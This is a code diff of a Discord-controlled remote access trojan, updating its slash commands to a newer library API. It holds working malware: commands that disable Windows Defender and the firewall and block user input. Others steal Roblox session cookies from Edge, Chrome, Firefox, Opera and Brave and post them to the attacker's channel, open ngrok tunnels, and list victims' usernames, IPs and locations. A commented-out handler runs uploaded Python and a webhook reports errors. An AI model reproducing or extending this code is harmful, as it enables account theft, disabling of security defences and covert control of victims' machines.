-@slash.slash(name="diasableAntivirus", description="disable the anti virus", guild_ids=g)
-async def disableAntivirus_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="diasableantivirus", description="disable the anti virus", guild_ids=g)
+async def disableantivirus_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import ctypes
             import os
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -1462,26 +1519,26 @@ async def disableAntivirus_command(ctx: SlashContext):
                 boom = done[2:]
                 if boom <= ['17763']:
                     os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
-                    await ctx.send("[*] Command successfuly executed")
+                    await interaction.channel.send("[*] Command successfuly executed")
                 elif boom >= ['18362']:
                     os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
-                    await ctx.send("[*] Command successfuly executed")
+                    await interaction.channel.send("[*] Command successfuly executed")
                 else:
-                    await ctx.send("[*] An unknown error has occurred")     
+                    await interaction.channel.send("[*] An unknown error has occurred")     
             else:
-                await ctx.send("[*] This command requires admin privileges")
+                await interaction.channel.send("[*] This command requires admin privileges")
 
-@slash.slash(name="diasableFireWall", description="disable the fire wall", guild_ids=g)
-async def disableFireWall_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="diasablefirewall", description="disable the fire wall", guild_ids=g)
+async def disablefirewall_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import ctypes
             import os
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 os.system(r"NetSh Advfirewall set allprofiles state off")
-                await ctx.send("[*] Command successfuly executed")
+                await interaction.channel.send("[*] Command successfuly executed")
             else:
-                await ctx.send("[*] This command requires admin privileges")
+                await interaction.channel.send("[*] This command requires admin privileges")
 
 
 
@@ -1490,9 +1547,9 @@ async def disableFireWall_command(ctx: SlashContext):
 
 
 
-@slash.slash(name="selfDestruct", description="selfDestruct", guild_ids=g)
-async def selfDestruct_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="selfdestruct", description="selfDestruct", guild_ids=g)
+async def selfdestruct_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import inspect
             import os
             import sys
@@ -1518,9 +1575,9 @@ async def selfDestruct_command(ctx: SlashContext):
 
 
 
-@slash.slash(name="displayoff", description="display off", guild_ids=g)
-async def displayoff_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="displayoff", description="display off", guild_ids=g)
+async def displayoff_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
@@ -1530,16 +1587,16 @@ async def displayoff_command(ctx: SlashContext):
                 SC_MONITORPOWER = 61808
                 ctypes.windll.user32.BlockInput(True)
                 ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
-                await ctx.send("[*] Command successfuly executed")
+                await interaction.channel.send("[*] Command successfuly executed")
             else:
-                await ctx.send("[!] Admin rights are required for this operation")
+                await interaction.channel.send("[!] Admin rights are required for this operation")
 
 
 
 
-@slash.slash(name="displayon", description="display on", guild_ids=g)
-async def displayon_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="displayon", description="display on", guild_ids=g)
+async def displayon_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         try:
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -1551,21 +1608,21 @@ async def displayon_command(ctx: SlashContext):
                 keyboard.press(Key.esc)
                 keyboard.release(Key.esc)
                 ctypes.windll.user32.BlockInput(False)
-                await ctx.send("[*] Command successfuly executed")
+                await interaction.channel.send("[*] Command successfuly executed")
             else:
-                await ctx.send("[!] Admin rights are required for this operation")
+                await interaction.channel.send("[!] Admin rights are required for this operation")
         except Exception as e:
-            await ctx.send(f"```error```\n {e}")
+            await interaction.channel.send(f"```error```\n {e}")
 
 
 
 
 
 
-@slash.slash(name="ejectCD", description="eject the fisic cd", guild_ids=g)
-async def ejectCD_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            await ctx.send("ejecting cd")
+@client.slash_command(name="ejectcd", description="eject the fisic cd", guild_ids=g)
+async def ejectcd_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("ejecting cd")
             import ctypes
             return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
             
@@ -1573,28 +1630,28 @@ async def ejectCD_command(ctx: SlashContext):
 
 
 
-@slash.slash(name="retractCD", description="retract the fisic cd", guild_ids=g)
-async def retractCD_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            await ctx.send("RetractingCd")
+@client.slash_command(name="retractcd", description="retract the fisic cd", guild_ids=g)
+async def retractcd_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("RetractingCd")
             import ctypes
             return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
             
 
-@slash.slash(name="cd", description="change directory", guild_ids=g)
-async def changeDir_command(ctx: SlashContext, dir: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="cd", description="change directory", guild_ids=g)
+async def cd_command(interaction: Interaction, dir: str):
+    if interaction.channel.name == channel_name:
             import os
             os.chdir(dir)
-            await ctx.send(f"cd to : {dir}")
+            await interaction.channel.send(f"cd to : {dir}")
 
-@slash.slash(name="notify", description="notify their pc", guild_ids=g)
-async def notify_command(ctx: SlashContext,app_name:str, message: str, title: str, icon_url:str=None):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="notify", description="notify their pc", guild_ids=g)
+async def notify_command(interaction: Interaction,app_name:str, message: str, title: str, icon_url:str=None):
+    if interaction.channel.name == channel_name:
         import plyer.platforms
         import plyer.platforms.win
         import plyer.platforms.win.notification
-        await ctx.send("sending")
+        await interaction.channel.send("sending")
         if icon_url != None:
             try:
                 temp = (os.getenv("TEMP"))
@@ -1609,10 +1666,10 @@ async def notify_command(ctx: SlashContext,app_name:str, message: str, title: st
                     app_icon = (temp + r"/app_icon.ico"),
                     message = message
                 )
-                await ctx.send("Notification send")
+                await interaction.channel.send("Notification send")
                 os.remove(temp + "/app_icon.ico")
             except Exception as e:
-                await ctx.send(f"```error```\n {e}")
+                await interaction.channel.send(f"```error```\n {e}")
         else:
             try:  
                 from plyer import notification
@@ -1622,80 +1679,80 @@ async def notify_command(ctx: SlashContext,app_name:str, message: str, title: st
                     message = message
                 )
             except Exception as e:
-                await ctx.send(f"```error```\n {e}")
-@client.event
-async def on_message(message):
-    if message.channel.name != channel_name:
-        pass
-    else:
-        total = []
-        for x in client.get_all_channels(): 
-            total.append(x.name)
+                await interaction.channel.send(f"```error```\n {e}")
+# @client.event
+# async def on_message(message):
+#     if message.channel.name != channel_name:
+#         pass
+#     else:
+#         total = []
+#         for x in client.get_all_channels(): 
+#             total.append(x.name)
 
 
-        if message.content.startswith("!audio"):
-            import os
-            temp = (os.getenv("TEMP"))
-            temp = temp + r"\audiofile.wav"
-            if os.path.isfile(temp):
-                delelelee = "del " + temp + r" /f"
-                os.system(delelelee)
-            temp1 = (os.getenv("TEMP"))
-            temp1 = temp1 + r"\sounds.vbs"
-            if os.path.isfile(temp1):
-                delelee = "del " + temp1 + r" /f"
-                os.system(delelee)                
-            await message.attachments[0].save(temp)
-            temp2 = (os.getenv("TEMP"))
-            f5 = open(temp2 + r"\sounds.vbs", 'a')
-            result = """ Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = """ + '"' + temp + '"' """: oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close """
-            f5.write(result)
-            f5.close()
-            os.system(r"start %temp%\sounds.vbs")
-            await message.channel.send("[*] Command successfuly executed")
-        elif message.content.startswith("!upload"):
-            await message.attachments[0].save(message.content[8:])
-            await message.channel.send(f"saved in ```{message.content[8:]}```")
-        elif message.content.startswith("!wallpaper"):
-            import ctypes
-            import os
-            path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
-            await message.attachments[0].save(path)
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
-            await message.channel.send("[*] Command successfuly executed")
-        elif message.content.startswith("!python"):
-            import sys, os
-            temp = (os.getenv("TEMP") + "\win32tempfile")
-            await message.attachments[0].save(temp)
-            await message.channel.send(f"saved in ```{temp}```")
-            from io import StringIO
-            import traceback
-            new_stdout = StringIO()
-            old_stdout = sys.stdout
-            sys.stdout = new_stdout
-            new_stderr = StringIO()
-            old_stderr = sys.stderr
-            sys.stderr = new_stderr
-            if os.path.exists(temp):
-                await message.channel.send("[*] Running python file...")
-                with open(temp, 'r') as f:
-                    python_code = f.read()
-                    try:
-                        exec(python_code)
-                    except Exception as exc:
-                        await message.channel.send(traceback.format_exc())
-            sys.stdout = old_stdout
-            sys.stderr = old_stderr
-            await message.channel.send(f"**output**```{new_stdout.getvalue()}{new_stderr.getvalue()}```")
-            (os.remove(temp))
+#         if message.content.startswith("!audio"):
+#             import os
+#             temp = (os.getenv("TEMP"))
+#             temp = temp + r"\audiofile.wav"
+#             if os.path.isfile(temp):
+#                 delelelee = "del " + temp + r" /f"
+#                 os.system(delelelee)
+#             temp1 = (os.getenv("TEMP"))
+#             temp1 = temp1 + r"\sounds.vbs"
+#             if os.path.isfile(temp1):
+#                 delelee = "del " + temp1 + r" /f"
+#                 os.system(delelee)                
+#             await message.attachments[0].save(temp)
+#             temp2 = (os.getenv("TEMP"))
+#             f5 = open(temp2 + r"\sounds.vbs", 'a')
+#             result = """ Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = """ + '"' + temp + '"' """: oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close """
+#             f5.write(result)
+#             f5.close()
+#             os.system(r"start %temp%\sounds.vbs")
+#             await message.channel.send("[*] Command successfuly executed")
+#         elif message.content.startswith("!upload"):
+#             await message.attachments[0].save(message.content[8:])
+#             await message.channel.send(f"saved in ```{message.content[8:]}```")
+#         elif message.content.startswith("!wallpaper"):
+#             import ctypes
+#             import os
+#             path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
+#             await message.attachments[0].save(path)
+#             ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
+#             await message.channel.send("[*] Command successfuly executed")
+#         elif message.content.startswith("!python"):
+#             import sys, os
+#             temp = (os.getenv("TEMP") + "\win32tempfile")
+#             await message.attachments[0].save(temp)
+#             await message.channel.send(f"saved in ```{temp}```")
+#             from io import StringIO
+#             import traceback
+#             new_stdout = StringIO()
+#             old_stdout = sys.stdout
+#             sys.stdout = new_stdout
+#             new_stderr = StringIO()
+#             old_stderr = sys.stderr
+#             sys.stderr = new_stderr
+#             if os.path.exists(temp):
+#                 await message.channel.send("[*] Running python file...")
+#                 with open(temp, 'r') as f:
+#                     python_code = f.read()
+#                     try:
+#                         exec(python_code)
+#                     except Exception as exc:
+#                         await message.channel.send(traceback.format_exc())
+#             sys.stdout = old_stdout
+#             sys.stderr = old_stderr
+#             await message.channel.send(f"**output**```{new_stdout.getvalue()}{new_stderr.getvalue()}```")
+#             (os.remove(temp))
 
 
 
 
-@slash.slash(name="winsound", description="windows sound their pc", guild_ids=g)
-async def winsound_command(ctx: SlashContext, soundfilepath: str,times: int):
-    if ctx.channel.name == channel_name:
-        await ctx.send("Sending sounds")
+@client.slash_command(name="winsound", description="windows sound their pc", guild_ids=g)
+async def winsound_command(interaction: Interaction, soundfilepath: str,times: int):
+    if interaction.channel.name == channel_name:
+        await interaction.channel.send("Sending sounds")
         n = times
         temp= (f"{soundfilepath}")
         temp2 = (os.getenv("TEMP"))
@@ -1708,10 +1765,10 @@ async def winsound_command(ctx: SlashContext, soundfilepath: str,times: int):
                 try:
                     os.system(r"start %temp%\winsounds.vbs")
                 except:
-                    await ctx.send("There is a problem or thats not a windows file")
+                    await interaction.channel.send("There is a problem or thats not a windows file")
                 time.sleep(.5)
                 n-=1
-        await ctx.send("All sounds send")
+        await interaction.channel.send("All sounds send")
 
 
 
@@ -1719,16 +1776,16 @@ async def winsound_command(ctx: SlashContext, soundfilepath: str,times: int):
 
 
 
-@slash.slash(name="robloxCookie", description="get robloxCookie", guild_ids=g)
-async def robloxCookie_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="robloxcookie", description="get robloxCookie", guild_ids=g)
+async def robloxcookie_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         import browser_cookie3
 
         try:
                         cookies = browser_cookie3.edge(domain_name='roblox.com')
                         cookies = str(cookies)
                         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-                        await ctx.send(cookie)
+                        await interaction.channel.send(cookie)
         except:
                         pass
 
@@ -1737,7 +1794,7 @@ async def robloxCookie_command(ctx: SlashContext):
                         cookies = browser_cookie3.chrome(domain_name='roblox.com')
                         cookies = str(cookies)
                         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-                        await ctx.send(cookie)
+                        await interaction.channel.send(cookie)
                         
         except:
                         pass
@@ -1747,7 +1804,7 @@ async def robloxCookie_command(ctx: SlashContext):
                         cookies = browser_cookie3.firefox(domain_name='roblox.com')
                         cookies = str(cookies)
                         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-                        await ctx.send(cookie)
+                        await interaction.channel.send(cookie)
         except:
                         pass
 
@@ -1756,7 +1813,7 @@ async def robloxCookie_command(ctx: SlashContext):
                         cookies = browser_cookie3.opera(domain_name='roblox.com')
                         cookies = str(cookies)
                         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-                        await ctx.send(cookie)
+                        await interaction.channel.send(cookie)
         except:
                         pass
 
@@ -1765,14 +1822,14 @@ async def robloxCookie_command(ctx: SlashContext):
                         cookies = browser_cookie3.brave(domain_name='roblox.com')
                         cookies = str(cookies)
                         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-                        await ctx.send(cookie)
+                        await interaction.channel.send(cookie)
         except:
                         pass
 
 
-@slash.slash(name="startNgrok", description="start port forwarding", guild_ids=g)
-async def startNgrok_command(ctx: SlashContext, token: str, port: int):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="startngrok", description="start port forwarding", guild_ids=g)
+async def startngrok_command(interaction: Interaction, token: str, port: int):
+    if interaction.channel.name == channel_name:
         import time
         ntoken = token
         global ngrokMode
@@ -1795,52 +1852,34 @@ async def startNgrok_command(ctx: SlashContext, token: str, port: int):
         tngrok = threading.Thread(target=ngrok)
         tngrok._running = True
         tngrok.daemon = True
-        await ctx.send("starting please wait 30 secons")
+        await interaction.channel.send("starting please wait 30 secons")
         tngrok.start()
         time.sleep(30)
-        await ctx.send(f"ngrok Started! link \n \n{ngrok_tunnel}")
+        await interaction.channel.send(f"ngrok Started! link \n \n{ngrok_tunnel}")
 
 
 
 
 
 
-from tkinter import *
-@slash.slash(name="gotHacked", description="stop ngrok", guild_ids=g)
-async def gotHacked_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            from random import randint
-            import time
-            import threading
 
-            root = Tk()
-            root.attributes("-alpha", 0)
-            root.overrideredirect(1)
-            root.attributes("-topmost", 1)
 
-            def placewindows():
-                while True:
-                    win = Toplevel(root)
-                    win.geometry("300x60+" + str(randint(0, root.winfo_screenwidth() - 300)) + "+" + str(randint(0, root.winfo_screenheight() - 60)))
-                    win.overrideredirect(1)
-                    Label(win, text="You got hacked", fg="red").place(relx=.38, rely=.3)
-                    win.lift()
-                    win.attributes("-topmost", True)
-                    win.attributes("-topmost", False)
-                    root.lift()
-                    root.attributes("-topmost", True)
-                    root.attributes("-topmost", False)
-                    time.sleep(.05)
-
-            threading.Thread(target=placewindows).start()
-
-            root.mainloop()
-
-@slash.slash(name="victims", description="send all acive pc's", guild_ids=g)
+@client.slash_command(name="victims", description="send all acive pc's", guild_ids=g)
 async def victims_command(message):
     await message.channel.send(f"```{os.getlogin()} | {ip} | {country} | {city} || session : {channel_name}```")
 
 
+
+
+
+
+
+
+
+
+
+
+#----------------------------------------------------
 def tryLogin():
     while True:
         get_token()
@@ -1850,10 +1889,10 @@ def tryLogin():
             get_gild()
             client.run(token)
             return
-        except:
+        except Exception as e:
             if webhookMode == True:
                 try:
-                    webhook.send(f"{os.getlogin()} | {ip} | {country} | {city} || ```have an error when tried to connect your bot please check your token and gild here``` {weblink}/public")
+                    DiscordWebhook(url=(webhook), content=f"{os.getlogin()} | {ip} | {country} | {city} || ```{e}``` {weblink}/public").execute()
                 except:
                     pass
             time.sleep(10)
